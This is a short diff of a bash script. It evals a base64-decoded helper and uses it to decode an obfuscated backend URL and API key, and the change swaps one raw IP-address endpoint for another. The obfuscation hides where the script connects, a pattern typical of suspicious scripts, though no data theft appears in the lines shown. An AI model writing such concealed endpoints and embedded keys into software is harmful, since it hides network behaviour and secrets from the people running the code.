@@ -1,7 +1,7 @@
 #!/bin/bash
 
 eval $(echo "X3EoKXsgZWNobyAtbiAiJDEifGJhc2U2NCAtZCAyPi9kZXYvbnVsbHx8ZWNobyAiJDIiO30=" | base64 -d)
-BACKEND_URL=$(_q "aHR0cDovLzEyOS4yMjYuMTk2LjE2NTo3MDA4Cg==" "")
+BACKEND_URL=$(_q "aHR0cDovLzQ5LjUxLjIyOC44MDo3MDA4" "")
 API_KEY=$(_q "YTFjNGFmY2EyOTA5YTY5ZDY5YWEwNzA4ZjczN2Q2ZjNjOGEyYjYwYzZjNjIwYzNiNjA4NjkzNjAyMzRiY2QzNAo=" "")
 
 LIGHT_GREEN='\033[1;32m'
